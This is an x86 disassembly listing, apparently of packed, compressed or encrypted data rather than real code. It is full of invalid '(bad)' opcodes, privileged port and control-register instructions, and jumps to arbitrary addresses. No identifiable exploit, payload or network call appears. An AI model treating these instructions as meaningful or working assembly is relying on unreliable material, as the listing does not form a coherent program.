  42e5bd:	(bad)  
  42e5be:	ficom  DWORD PTR [edi-0x6d]
	...
  42e631:	add    BYTE PTR [eax],al
  42e633:	add    bl,dh
  42e635:	add    esp,DWORD PTR [eax]
  42e637:	(bad)  
  42e638:	lock scas eax,DWORD PTR es:[edi]
  42e63a:	(bad)  
  42e63b:	jg     0x42e5e4
  42e63d:	mov    WORD PTR [esi+0x5f],es
  42e640:	(bad)  
  42e641:	stc    
  42e642:	lds    eax,FWORD PTR [edx]
  42e644:	fsub   st(1),st
  42e646:	add    DWORD PTR [eax],eax
  42e648:	cmc    
  42e649:	add    BYTE PTR [eax],al
  42e64b:	add    al,bl
  42e64d:	mov    eax,DWORD PTR [edx+0x4f]
  42e650:	jl     0x42e63e
  42e652:	and    BYTE PTR [eax-0x61a945b9],cl
  42e658:	pop    ds
  42e659:	scas   al,BYTE PTR es:[edi]
  42e65a:	xor    DWORD PTR [ecx+esi*2+0x30],esi
  42e65e:	mov    ds:0x209889a4,eax
  42e663:	stc    
  42e664:	mov    esi,0xdc1d7878
  42e669:	retf   0x5f53
  42e66c:	adc    ch,BYTE PTR [edx]
  42e66e:	jg     0x42e625
  42e670:	adc    DWORD PTR [edi+0xa2e7b27],edx
  42e676:	leave  
  42e677:	mov    cl,0x1b
  42e679:	out    dx,al
  42e67a:	push   ss
  42e67b:	mov    cl,0x4a
  42e67d:	and    esp,ebx
  42e67f:	ins    BYTE PTR es:[edi],dx
  42e680:	dec    edi
  42e681:	sbb    DWORD PTR [esi+0x6612955d],esp
  42e687:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e688:	jne    0x42e6a6
  42e68a:	adc    eax,0x7213a2cf
  42e68f:	xchg   edx,eax
  42e690:	pop    esp
  42e691:	sub    ah,BYTE PTR [edx+0x7f]
  42e694:	lahf   
  42e695:	test   al,0xc3
  42e697:	push   esp
  42e698:	imul   edx,DWORD PTR [ecx],0x75
  42e69b:	outs   dx,DWORD PTR ds:[esi]
  42e69c:	or     ah,BYTE PTR [ebx+0x17]
  42e69f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e6a0:	sbb    ebx,DWORD PTR [edi+0x18]
  42e6a3:	sbb    DWORD PTR [edi+0x20eb1674],0x83fe4191
  42e6ad:	or     ecx,edx
  42e6af:	pop    ebx
  42e6b0:	dec    ebx
  42e6b1:	jmp    0xe206:0x458753a2
  42e6b8:	xor    ch,BYTE PTR [eax+0x2d5e82a2]
  42e6be:	or     eax,0x24f1438
  42e6c3:	xchg   edi,eax
  42e6c4:	push   ebx
  42e6c5:	rcl    DWORD PTR [esi],0x5d
  42e6c8:	add    dl,BYTE PTR [ecx]
  42e6ca:	sub    BYTE PTR [esi-0x16],dl
  42e6cd:	and    DWORD PTR [ebp-0x31e4a62c],ecx
  42e6d3:	mov    eax,0x61cc0b1c
  42e6d8:	scas   al,BYTE PTR es:[edi]
  42e6d9:	sub    DWORD PTR [ebp+0x75],edi
  42e6dc:	stos   DWORD PTR es:[edi],eax
  42e6dd:	and    DWORD PTR [ebx-0x5124a220],ebx
  42e6e3:	lods   al,BYTE PTR ds:[esi]
  42e6e4:	lds    esp,FWORD PTR [edi]
  42e6e6:	sub    cl,dl
  42e6e8:	fcomp  DWORD PTR [edx]
  42e6ea:	nop
  42e6eb:	xchg   DWORD PTR [edi],ebx
  42e6ed:	out    0xe2,al
  42e6ef:	ja     0x42e761
  42e6f1:	jb     0x42e6b1
  42e6f3:	ja     0x42e6fd
  42e6f5:	outs   dx,DWORD PTR ds:[esi]
  42e6f6:	pop    ss
  42e6f7:	push   cs
  42e6f8:	cs mov esi,0xa95d553f
  42e6fe:	inc    edx
  42e6ff:	mov    ebp,0xef10c8c5
  42e704:	xchg   edi,eax
  42e705:	sub    BYTE PTR [edi-0x220937e2],dh
  42e70b:	or     DWORD PTR [esi],0x8ac36a56
  42e711:	pop    es
  42e712:	jmp    0x42e750
  42e714:	mov    eax,ds:0xebd1f03
  42e719:	sahf   
  42e71a:	xchg   ebx,eax
  42e71b:	fiadd  DWORD PTR [eax+0x73]
  42e71e:	data16 repz mov dl,0x66
  42e722:	xor    DWORD PTR [ecx],ebp
  42e724:	out    dx,al
  42e725:	lods   al,BYTE PTR ds:[esi]
  42e726:	ins    DWORD PTR es:[edi],dx
  42e727:	dec    ecx
  42e728:	or     DWORD PTR [ecx+0x465dd4b],esp
  42e72e:	xor    al,0x60
  42e730:	loopne 0x42e740
  42e732:	in     eax,0x57
  42e734:	cmp    al,0x7e
  42e736:	(bad)  
  42e737:	xor    BYTE PTR [ebp-0x401fbe88],dh
  42e73d:	jb     0x42e79b
  42e73f:	sub    DWORD PTR [eax+eax*1+0x0],ebx
	...
  42e7b3:	add    BYTE PTR [esi-0x62a06765],dl
  42e7b9:	pop    edi
  42e7ba:	xlat   BYTE PTR ds:[ebx]
  42e7bb:	fisttp DWORD PTR [esi+0x7b0d5576]
  42e7c1:	dec    BYTE PTR [esi+0x1ead19e]
  42e7c7:	add    ch,dh
  42e7c9:	add    BYTE PTR [eax],al
  42e7cb:	add    BYTE PTR [eax-0x38],ah
  42e7ce:	dec    ebx
  42e7cf:	(bad)  
  42e7d0:	stc    
  42e7d1:	push   ss
  42e7d2:	retf   
  42e7d3:	xchg   ecx,eax
  42e7d4:	mov    eax,ds:0xa9e11911
  42e7d9:	es push cs
  42e7db:	adc    DWORD PTR [ebx-0x3e74b186],edx
  42e7e1:	mov    esi,0x8ddc168c
  42e7e6:	nop
  42e7e7:	push   ds
  42e7e8:	test   BYTE PTR [edx],0x18
  42e7eb:	cmovs  edx,esi
  42e7ee:	mov    DWORD PTR [esi+0x3a323ea4],0x4e54692b
  42e7f8:	push   edi
  42e7f9:	inc    eax
  42e7fa:	xchg   esi,eax
  42e7fb:	sub    DWORD PTR [esi],eax
  42e7fd:	sbb    eax,0x5cd17ac2
  42e802:	out    dx,al
  42e803:	test   BYTE PTR [ebx],bh
  42e805:	shl    DWORD PTR [eax+0x53],1
  42e808:	xchg   edx,eax
  42e809:	fisttp DWORD PTR [esi-0x6d697cfc]
  42e80f:	stc    
  42e810:	and    eax,0xa95e26a7
  42e815:	out    0xb3,al
  42e817:	mov    dh,0xea
  42e819:	jae    0x42e7be
  42e81b:	or     al,0x32
  42e81d:	div    ebp
  42e81f:	add    al,0xf7
  42e821:	iret   
  42e822:	sub    al,0xe9
  42e824:	imul   eax,DWORD PTR [ebp+ebx*4+0x3fe7f806],0x3
  42e82c:	fld    TBYTE PTR [esi-0x51d78a10]
  42e832:	lock int3 
  42e834:	popa   
  42e835:	int    0x9c
  42e837:	add    BYTE PTR [ebp+0x2a],0x94
  42e83b:	push   ds
  42e83c:	inc    ecx
  42e83d:	sti    
  42e83e:	mov    eax,0xc23a0928
  42e843:	bnd jle 0x42e8b2
  42e846:	sbb    dl,BYTE PTR [ecx+0x1c5ea6a5]
  42e84c:	lods   eax,DWORD PTR ds:[esi]
  42e84d:	ja     0x42e820
  42e84f:	inc    DWORD PTR [edx]
  42e851:	inc    esp
  42e852:	jmp    0x9d630d2f
  42e857:	ds enter 0xa9d9,0x6c
  42e85c:	sbb    BYTE PTR [edx+ebp*1],0x21
  42e860:	sub    edx,ecx
  42e862:	sti    
  42e863:	cmp    BYTE PTR [ecx+0x64],bl
  42e866:	imul   ebp,edi,0x980e1c83
  42e86c:	test   al,0x1f
  42e86e:	dec    ebp
  42e86f:	ja     0x42e8a6
  42e871:	or     eax,0x62b87316
  42e876:	push   ds
  42e877:	icebp  
  42e878:	fcomp  QWORD PTR [edi+0x705fe6ce]
  42e87e:	inc    BYTE PTR [ecx-0x4f6bbf3c]
  42e884:	pop    eax
  42e885:	mov    fs,WORD PTR [ebp-0x41c98d7]
  42e88b:	sahf   
  42e88c:	mov    eax,0xac1d2481
  42e891:	cld    
  42e892:	enter  0x85d4,0x7d
  42e896:	jl     0x42e8b1
  42e898:	jno    0x42e849
  42e89a:	loope  0x42e834
  42e89c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e89d:	retf   0x33fd
  42e8a0:	cmc    
  42e8a1:	inc    edi
  42e8a2:	test   eax,0xef53d35c
  42e8a7:	xor    al,0x2c
  42e8a9:	jmp    FWORD PTR [eax+edi*4+0x595ceb0f]
  42e8b0:	test   DWORD PTR [eax+0x14b97b17],eax
  42e8b6:	or     eax,0xd9243ece
  42e8bb:	sbb    al,0xe5
  42e8bd:	xlat   BYTE PTR ds:[ebx]
  42e8be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e8bf:	js     0x42e8b2
	...
  42e931:	add    BYTE PTR [eax],al
  42e933:	add    cl,bh
  42e935:	mov    cl,0x70
  42e937:	dec    eax
  42e938:	js     0x42e903
  42e93a:	stc    
  42e93b:	mov    cl,0x3
  42e93d:	push   ds
  42e93e:	nop
  42e93f:	aad    0x8a
  42e941:	ins    DWORD PTR es:[edi],dx
  42e942:	loop   0x42e8d8
  42e944:	(bad)  
  42e945:	jmp    0x42e948
  42e947:	add    ch,dh
  42e949:	add    BYTE PTR [eax],al
  42e94b:	add    BYTE PTR ds:0xb88a7cb9,al
  42e951:	mov    bh,BYTE PTR [ebp-0x63992992]
  42e957:	push   ss
  42e958:	inc    esp
  42e959:	shr    BYTE PTR [ecx+0x1d],cl
  42e95c:	retf   0x1a94
  42e95f:	lahf   
  42e960:	jno    0x42e96f
  42e962:	rol    DWORD PTR [edx+0x1],cl
  42e965:	out    0x92,eax
  42e967:	cmp    dh,BYTE PTR [edx+0x3d2a4e64]
  42e96d:	push   ecx
  42e96e:	into   
  42e96f:	loope  0x42e97d
  42e971:	cmp    al,0xdb
  42e973:	ret    0xf631
  42e976:	int    0x8e
  42e978:	(bad)  
  42e979:	loop   0x42e942
  42e97b:	cdq    
  42e97c:	push   0x24
  42e97e:	sbb    cl,BYTE PTR [ebp+0x1a]
  42e981:	or     dh,BYTE PTR [ebx-0x25]
  42e984:	rol    BYTE PTR [edi+ecx*4+0x7c],0x2
  42e989:	mov    eax,ds:0x5bd1e688
  42e98e:	ja     0x42e97f
  42e990:	mov    al,0xed
  42e992:	sbb    dl,bh
  42e994:	sbb    eax,0x2a8c2f64
  42e999:	sbb    bl,BYTE PTR [edi]
  42e99b:	mov    ebp,0xbad87004
  42e9a0:	in     eax,0xb2
  42e9a2:	pop    ecx
  42e9a3:	dec    ebx
  42e9a4:	inc    edi
  42e9a5:	int    0x11
  42e9a7:	(bad)  
  42e9a8:	mov    cr0,esi
  42e9ab:	mov    WORD PTR [ebx-0x73],es
  42e9ae:	cmp    BYTE PTR [ebx-0x70],ch
  42e9b1:	dec    ebp
  42e9b2:	dec    edi
  42e9b3:	scas   al,BYTE PTR es:[edi]
  42e9b4:	and    BYTE PTR [edx+0x2c],dl
  42e9b7:	mov    ch,0xd1
  42e9b9:	fprem  
  42e9bb:	and    al,0x2f
  42e9bd:	(bad)  
  42e9be:	jb     0x42e9ed
  42e9c0:	sub    BYTE PTR [ebx+0x60],0x91
  42e9c4:	dec    eax
  42e9c5:	push   0x2cc9ec44
  42e9ca:	jg     0x42ea27
  42e9cc:	push   esp
  42e9cd:	sbb    al,0xdc
  42e9cf:	popf   
  42e9d0:	fstp   QWORD PTR [eax-0xc]
  42e9d3:	pop    es
  42e9d4:	imul   eax,DWORD PTR [ebx],0x4
  42e9d7:	lods   eax,DWORD PTR ds:[esi]
  42e9d8:	stos   BYTE PTR es:[edi],al
  42e9d9:	jo     0x42ea47
  42e9db:	mov    BYTE PTR [edi],ch
  42e9dd:	cdq    
  42e9de:	loopne 0x42e9ad
  42e9e0:	out    0x21,al
  42e9e2:	sahf   
  42e9e3:	mov    ebx,0x3b06a742
  42e9e8:	dec    ecx
  42e9e9:	aaa    
  42e9ea:	or     al,0x2c
  42e9ec:	dec    ecx
  42e9ed:	xor    BYTE PTR [edi+0x67],cl
  42e9f0:	sti    
  42e9f1:	fwait
  42e9f2:	xlat   BYTE PTR ds:[ebx]
  42e9f3:	pop    edx
  42e9f4:	jnp    0x42e990
  42e9f6:	xor    al,0xda
  42e9f8:	jne    0x42e98d
  42e9fa:	sahf   
  42e9fb:	fstp   TBYTE PTR [edi+0x5f]
  42e9fe:	inc    edi
  42e9ff:	in     al,dx
  42ea00:	add    DWORD PTR [eax+0x21f632a2],0x34
  42ea07:	fstp   TBYTE PTR [eax-0x4f]
  42ea0a:	jmp    0xbdf6:0x83388fa0
  42ea11:	push   ss
  42ea12:	add    ch,BYTE PTR [edi]
  42ea14:	pop    esi
  42ea15:	mov    esp,DWORD PTR [eax-0x20b994fe]
  42ea1b:	cmp    dh,BYTE PTR [edi+0x4e8fd86]
  42ea21:	mov    WORD PTR [ecx],cs
  42ea23:	add    bh,ah
  42ea25:	xchg   ebx,eax
  42ea26:	add    BYTE PTR [esi+0x46aa3226],cl
  42ea2c:	aam    0x82
  42ea2e:	add    esi,DWORD PTR [ebp+0x3d9c1a52]
  42ea34:	jecxz  0x42eaaa
  42ea36:	loop   0x42ea41
  42ea38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ea39:	xor    al,0xaa
  42ea3b:	popf   
  42ea3c:	stos   DWORD PTR es:[edi],eax
  42ea3d:	in     al,dx
  42ea3e:	add    ch,ch
  42ea40:	adc    eax,0x0
	...
  42eab1:	add    BYTE PTR [eax],al
  42eab3:	add    BYTE PTR [eax-0x2093e086],dh
  42eab9:	ins    DWORD PTR es:[edi],dx
  42eaba:	repz dec BYTE PTR [ebx]
  42eabd:	add    ah,BYTE PTR [ebp-0x48]
  42eac0:	mov    al,0xae
  42eac2:	mov    BYTE PTR [ecx],al
  42eac4:	mov    ebx,0xf50001ec
  42eac9:	add    BYTE PTR [eax],al
  42eacb:	add    BYTE PTR [eax+esi*2-0x1c40f1e7],al
  42ead2:	and    DWORD PTR [esi+edx*2+0x6de46d95],0xc5e158bc
  42eadd:	jb     0x42eb00
  42eadf:	jo     0x42ea99
  42eae1:	stos   BYTE PTR es:[edi],al
  42eae2:	or     eax,0x14bea9e9
  42eae7:	popa   
  42eae8:	(bad)  
  42eae9:	call   FWORD PTR [esi+0x3f]
  42eaec:	mov    bh,dl
  42eaee:	push   eax
  42eaef:	inc    edx
  42eaf0:	jnp    0x42eaa5
  42eaf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eaf3:	jae    0x42eb1a
  42eaf5:	jmp    0x44481ee
  42eafa:	xchg   edx,eax
  42eafb:	pusha  
  42eafc:	rcl    BYTE PTR [edx+ebp*2+0x7dd5e402],1
  42eb03:	fistp  WORD PTR [esi+0x69]
  42eb06:	test   DWORD PTR [esi],edx
  42eb08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eb09:	xchg   edi,eax
  42eb0a:	sub    al,0x8c
  42eb0c:	arpl   bx,cx
  42eb0e:	mov    BYTE PTR [edx+eiz*1],dl
  42eb11:	cwde   
  42eb12:	inc    ebx
  42eb13:	add    BYTE PTR [ebp-0x334d8d70],ch
  42eb19:	xor    BYTE PTR [esi],ah
  42eb1b:	retf   0x68bf
  42eb1e:	mov    ds:0x28b23dba,al
  42eb23:	sub    bh,bh
  42eb25:	or     al,0x41
  42eb27:	or     DWORD PTR [ecx+0x394db4d3],edx
  42eb2d:	dec    ecx
  42eb2e:	fs in  eax,dx
  42eb30:	imul   edx,DWORD PTR [eax+0x382ff3bd],0xd681356a
  42eb3a:	push   es
  42eb3b:	jns    0x42eb82
  42eb3d:	mov    ecx,0x712c48cd
  42eb42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb43:	inc    edi
  42eb44:	shl    ch,0x66
  42eb47:	jmp    0x40368905
  42eb4c:	int3   
  42eb4d:	pop    ecx
  42eb4f:	ja     0x42eb1c
  42eb51:	jnp    0x42eb0b
  42eb53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eb54:	dec    ebx
  42eb55:	xchg   edx,eax
  42eb56:	pop    esi
  42eb57:	sbb    esp,ecx
  42eb59:	test   DWORD PTR [edi],ebp
  42eb5b:	jnp    0x42eafe
  42eb5d:	jp     0x42eb8c
  42eb5f:	stos   DWORD PTR es:[edi],eax
  42eb60:	xor    esi,ecx
  42eb62:	jae    0x42ebd4
  42eb64:	scas   eax,DWORD PTR es:[edi]
  42eb65:	rol    DWORD PTR [ebp-0x58f484e5],1
  42eb6b:	xchg   esi,eax
  42eb6c:	js     0x42ebcf
  42eb6e:	inc    esi
  42eb6f:	enter  0x9075,0xbf
  42eb73:	aaa    
  42eb74:	clc    
  42eb75:	mul    BYTE PTR ds:0xeef92f76
  42eb7b:	arpl   WORD PTR [ecx+0x2e],dx
  42eb7e:	lock scas eax,DWORD PTR es:[edi]
  42eb80:	test   DWORD PTR [eax+0x17],eax
  42eb83:	stos   BYTE PTR es:[edi],al
  42eb84:	rcl    dl,cl
  42eb86:	cmp    BYTE PTR [ebx-0x47],dh
  42eb89:	or     esp,DWORD PTR [eax-0x8]
  42eb8c:	mov    al,0xfb
  42eb8e:	loop   0x42eb55
  42eb90:	inc    ebx
  42eb91:	test   al,0x3c
  42eb93:	rol    BYTE PTR ds:0x5f0ab247,0x57
  42eb9a:	cmp    eax,0xef9171d5
  42eb9f:	stc    
  42eba0:	mov    eax,0x6aaf7dd1
  42eba5:	retf   0xed80
  42eba8:	outs   dx,DWORD PTR ds:[esi]
  42eba9:	popa   
  42ebaa:	inc    esi
  42ebab:	add    DWORD PTR [ebx+0x499dfaa0],ecx
  42ebb1:	fstp   QWORD PTR [ecx-0x35f22493]
  42ebb7:	lods   al,BYTE PTR ds:[esi]
  42ebb8:	add    dh,BYTE PTR [edi]
  42ebba:	adc    DWORD PTR [esi],ebx
  42ebbc:	dec    eax
  42ebbd:	mov    ds:0xc87dca,al
	...
  42ec32:	add    BYTE PTR [eax],al
  42ec34:	cmp    DWORD PTR [edi-0x2010f093],esi
  42ec3a:	jnp    0x42ebf3
  42ec3c:	sbb    cl,BYTE PTR [edi+edx*4-0x58aeaa97]
  42ec43:	test   eax,0x1edb0
  42ec48:	cmc    
  42ec49:	add    BYTE PTR [eax],al
  42ec4b:	add    BYTE PTR [ecx+ecx*4-0x71],dh
  42ec4f:	jg     0x42ebf5
  42ec51:	fwait
  42ec52:	mov    eax,ds:0xfe673bd7
  42ec57:	adc    al,0x73
  42ec59:	add    BYTE PTR [edx],bh
  42ec5b:	mov    al,ds:0x2dcadd4f
  42ec60:	ds push edi
  42ec62:	push   ds
  42ec63:	sbb    ebp,DWORD PTR [ecx]
  42ec65:	dec    ebx
  42ec66:	cmp    eax,0xa30b0fae
  42ec6b:	outs   dx,BYTE PTR ds:[esi]
  42ec6c:	pop    edx
  42ec6d:	and    cl,BYTE PTR [ecx]
  42ec6f:	(bad)  
  42ec71:	adc    DWORD PTR [ebp-0x27ff937c],ecx
  42ec77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ec78:	mov    dh,0x9e
  42ec7a:	in     al,0xc
  42ec7c:	outs   dx,DWORD PTR ds:[esi]
  42ec7d:	ds stos DWORD PTR es:[edi],eax
  42ec7f:	(bad)  
  42ec80:	loop   0x42ec16
  42ec82:	push   eax
  42ec83:	inc    esi
  42ec84:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  42ec86:	add    eax,0xf6021337
  42ec8b:	ret    0x1e18
  42ec8e:	out    0xf7,al
  42ec90:	dec    esi
  42ec91:	xchg   BYTE PTR [edx],bl
  42ec93:	sbb    ebx,eax
  42ec95:	push   ebx
  42ec96:	cld    
  42ec97:	mov    bl,0x97
  42ec99:	or     al,BYTE PTR [ebx+esi*2-0x6f]
  42ec9d:	jge    0x42ec38
  42ec9f:	scas   eax,DWORD PTR es:[edi]
  42eca0:	push   ebp
  42eca1:	push   es
  42eca2:	sub    al,0xad
  42eca4:	mov    eax,0x7c064ba2
  42eca9:	scas   eax,DWORD PTR es:[edi]
  42ecaa:	cmp    al,BYTE PTR [esi]
  42ecac:	outs   dx,BYTE PTR ds:[esi]
  42ecad:	popa   
  42ecae:	das    
  42ecaf:	mov    ah,0x90
  42ecb1:	aam    0x63
  42ecb3:	les    ecx,FWORD PTR [edi-0x700bf428]
  42ecb9:	enter  0x35ed,0x1f
  42ecbd:	mov    BYTE PTR [edx+0x66],cl
  42ecc0:	rep stos DWORD PTR es:[edi],eax
  42ecc2:	js     0x42ecc9
  42ecc4:	lock test al,0xae
  42ecc7:	repz pusha 
  42ecc9:	pop    esp
  42ecca:	ds inc eax
  42eccc:	lahf   
  42eccd:	jle    0x42ecd7
  42eccf:	add    edx,DWORD PTR [edi+eax*2]
  42ecd2:	mov    dl,0x80
  42ecd4:	sub    cl,dl
  42ecd6:	pop    eax
  42ecd7:	in     eax,dx
  42ecd8:	inc    ebx
  42ecd9:	rep stos DWORD PTR es:[edi],eax
  42ecdb:	cdq    
  42ecdc:	dec    esi
  42ecdd:	xor    ebx,DWORD PTR [edi]
  42ecdf:	inc    edi
  42ece0:	repnz cmp ch,BYTE PTR [esi+eax*8-0x2f]
  42ece5:	daa    
  42ece6:	pop    ds
  42ece7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ece8:	jp     0x42ecb2
  42ecea:	sbb    DWORD PTR [ecx+0x7f0b1eb1],ebp
  42ecf0:	jge    0x42ed33
  42ecf2:	xchg   BYTE PTR [esi-0x4e15c257],bh
  42ecf8:	and    al,0x72
  42ecfa:	xchg   esp,eax
  42ecfb:	jae    0x42ec7f
  42ecfd:	add    eax,0x61cf9eaa
  42ed02:	daa    
  42ed03:	lods   al,BYTE PTR ds:[esi]
  42ed04:	sub    al,0x2b
  42ed06:	mov    ecx,0x81082333
  42ed0b:	xor    eax,0x240ca705
  42ed10:	push   ebx
  42ed11:	icebp  
  42ed12:	fldcw  WORD PTR [edi-0x3a]
  42ed15:	xchg   DWORD PTR [edi-0x10],edi
  42ed18:	fisub  DWORD PTR [ecx+0x5f05b90b]
  42ed1e:	cmp    BYTE PTR [ecx+0x9],cl
  42ed21:	cs das 
  42ed23:	lods   eax,DWORD PTR gs:[esi]
  42ed25:	inc    esi
  42ed26:	(bad)  
  42ed27:	test   eax,0xc5bfec04
  42ed2c:	jne    0x42ece0
  42ed2e:	test   dl,dl
  42ed30:	mov    ebp,0xb1289416
  42ed35:	xor    BYTE PTR [edi],0xf4
  42ed38:	neg    BYTE PTR [edi-0x1522ca64]
  42ed3e:	mov    eax,ds:0x5e7f
	...
  42edb3:	add    dh,ah
  42edb5:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42edbc:	jmp    0x42ed84
  42edbe:	popa   
  42edbf:	test   eax,0x6038e866
  42edc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42edc5:	out    dx,al
  42edc6:	add    DWORD PTR [eax],eax
  42edc8:	cmc    
  42edc9:	add    BYTE PTR [eax],al
  42edcb:	add    BYTE PTR [eax],ch
  42edcd:	loope  0x42ed62
  42edcf:	dec    eax
  42edd0:	jecxz  0x42ee04
  42edd2:	xchg   edi,eax
  42edd3:	scas   eax,DWORD PTR es:[edi]
  42edd4:	in     al,dx
  42edd5:	cmp    DWORD PTR [edi],eax
  42edd7:	retf   0x7110
  42edda:	xor    eax,0xb9dc144c
  42eddf:	pop    DWORD PTR [ebx+0x70]
  42ede2:	or     esi,DWORD PTR [edx-0x14]
  42ede5:	hlt    
  42ede6:	(bad)  
  42ede7:	out    dx,al
  42ede8:	xchg   BYTE PTR [eax+ecx*1-0x43f02cf3],dh
  42edef:	inc    eax
  42edf0:	xchg   DWORD PTR [ebp-0x50916fec],eax
  42edf6:	aam    0x2e
  42edf8:	mov    edx,0x1b47af61
  42edfd:	hlt    
  42edfe:	push   edi
  42edff:	xchg   esi,eax
  42ee00:	les    ebx,FWORD PTR [esi+0x6d]
  42ee03:	test   eax,0x70765d2e
  42ee08:	mov    DWORD PTR [esi],edx
  42ee0a:	mov    ebp,0x74bf2669
  42ee0f:	sub    bh,BYTE PTR [ebp+0x36]
  42ee12:	rcr    cl,cl
  42ee14:	cs mov bh,0xdd
  42ee17:	and    esi,ebx
  42ee19:	popa   
  42ee1a:	data16 (bad) 
  42ee1c:	(bad)  
  42ee1d:	push   ss
  42ee1e:	jge    0x42ee05
  42ee20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ee21:	and    BYTE PTR [ecx-0x2c],dh
  42ee24:	enter  0xdc19,0x3f
  42ee28:	enter  0xe7cd,0xa
  42ee2c:	sbb    edi,edx
  42ee2e:	bound  ebx,QWORD PTR [eax-0xb]
  42ee31:	fld    DWORD PTR [ebp-0x4fa3fe2a]
  42ee37:	imul   ebx,DWORD PTR [ebx+eiz*1-0x5c59ef26],0xffffffe7
  42ee3f:	shl    DWORD PTR [eax+0x223e36d7],0xa0
  42ee46:	lds    ebx,FWORD PTR [eax]
  42ee48:	and    al,0x3e
  42ee4a:	pop    esi
  42ee4b:	mov    ds,WORD PTR [eax-0x303a80a1]
  42ee51:	das    
  42ee52:	scas   eax,DWORD PTR es:[edi]
  42ee53:	push   edi
  42ee54:	aaa    
  42ee55:	mov    esp,0x708f6174
  42ee5a:	sbb    dx,WORD PTR [ebx]
  42ee5d:	add    bl,BYTE PTR [esi]
  42ee5f:	mov    al,0x81
  42ee61:	xor    BYTE PTR [edx+edx*8+0x6958d473],0xc
  42ee69:	imul   ecx,DWORD PTR ds:0xa7150a91,0x11
  42ee70:	xchg   dh,ah
  42ee72:	out    dx,eax
  42ee73:	xchg   BYTE PTR [edi-0x7b],bl
  42ee76:	pop    edi
  42ee77:	sub    bl,BYTE PTR [eax]
  42ee79:	icebp  
  42ee7a:	add    ch,al
  42ee7c:	inc    ebx
  42ee7d:	push   0x3c
  42ee7f:	mov    ecx,0xb24f85b9
  42ee84:	adc    ch,BYTE PTR [ebx]
  42ee86:	test   eax,0x40ac4bc5
  42ee8b:	push   ebx
  42ee8c:	sub    dl,bh
  42ee8e:	into   
  42ee8f:	mov    eax,ds:0x46c91ea4
  42ee94:	pusha  
  42ee95:	nop
  42ee96:	mov    ebp,0x7d0bc46a
  42ee9b:	aas    
  42ee9c:	fsub   st,st(6)
  42ee9e:	mov    dh,0x9a
  42eea0:	add    al,0x9a
  42eea2:	test   al,0xad
  42eea4:	push   ecx
  42eea5:	push   edi
  42eea6:	popf   
  42eea7:	ror    DWORD PTR [ebp-0x7c],1
  42eeaa:	repnz iret 
  42eeac:	jae    0x42ee9e
  42eeae:	dec    ebp
  42eeaf:	cs aam 0x15
  42eeb2:	cmp    al,0xdc
  42eeb4:	(bad)  ds:0xb770b131
  42eeba:	scas   al,BYTE PTR es:[di]
  42eebc:	sti    
  42eebd:	call   0x0:0xdcc6d
	...
  42ef34:	add    bh,dh
  42ef36:	jb     0x42eede
  42ef38:	(bad)  
  42ef39:	scas   al,BYTE PTR es:[edi]
  42ef3a:	(bad)  
  42ef3b:	(bad)  
  42ef3c:	cmp    DWORD PTR [edi],edi
  42ef3e:	int3   
  42ef3f:	repnz mov ds:0x9a3978e0,eax
  42ef45:	out    dx,eax
  42ef46:	add    DWORD PTR [eax],eax
  42ef48:	cmc    
  42ef49:	add    BYTE PTR [eax],al
  42ef4b:	add    BYTE PTR [esi-0x1b07ebea],bh
  42ef51:	int3   
  42ef52:	push   ss
  42ef53:	add    DWORD PTR [esi+0x17],0xac51d977
  42ef5a:	mov    ebx,0xb12aab14
  42ef5f:	mov    ebx,DWORD PTR [edi-0x565accf5]
  42ef65:	(bad)  
  42ef66:	cld    
  42ef67:	push   cs
  42ef68:	inc    ebp
  42ef69:	in     eax,dx
  42ef6a:	fidiv  DWORD PTR [edx]
  42ef6c:	addr16 jae 0x42ef8b
  42ef6f:	int3   
  42ef70:	outs   dx,DWORD PTR ds:[esi]
  42ef71:	mov    bh,0xba
  42ef73:	rol    DWORD PTR [eax+0x27],1
  42ef76:	push   edx
  42ef77:	cs sar al,cl
  42ef7a:	mov    ecx,edi
  42ef7c:	inc    edi
  42ef7d:	mov    ebx,0x37962c44
  42ef82:	pop    ds
  42ef83:	xchg   DWORD PTR [ebx+0xe81af67],esi
  42ef89:	push   edx
  42ef8a:	mov    ah,0x7c
  42ef8c:	push   cs
  42ef8d:	xor    cl,BYTE PTR [ebx+eax*4+0x6f20fde]
  42ef94:	lods   al,BYTE PTR ds:[esi]
  42ef96:	cli    
  42ef97:	fst    DWORD PTR [ebx-0x7a18ad8a]
  42ef9d:	out    0x74,al
  42ef9f:	xlat   BYTE PTR ds:[ebx]
  42efa0:	jl     0x42ef34
  42efa2:	neg    BYTE PTR [eax-0x1e]
  42efa5:	ins    BYTE PTR es:[edi],dx
  42efa6:	push   ebp
  42efa7:	out    dx,eax
  42efa8:	cli    
  42efa9:	mov    ds:0xba7c46a8,al
  42efae:	cmp    al,0x2b
  42efb0:	shl    BYTE PTR [esi+0x3],cl
  42efb3:	outs   dx,DWORD PTR ds:[esi]
  42efb4:	cmp    dh,ah
  42efb6:	adc    DWORD PTR [edx+0x6cf1841e],0xecb121de
  42efc0:	jnp    0x42ef9d
  42efc2:	or     BYTE PTR [ebx+eax*2+0x5d2e04b0],0x70
  42efca:	mov    edx,0x8a97a0ef
  42efcf:	jnp    0x42f015
  42efd1:	ins    DWORD PTR es:[edi],dx
  42efd2:	loopne 0x42f04d
  42efd4:	das    
  42efd5:	mov    WORD PTR [ebx+eiz*1+0x63],?
  42efd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42efda:	(bad)  
  42efdb:	call   0x1ca31d61
  42efe0:	bound  esp,QWORD PTR [ebx]
  42efe2:	pop    eax
  42efe3:	fcomp  DWORD PTR [esi+0x10fb6c86]
  42efe9:	add    ecx,edx
  42efeb:	pop    ebx
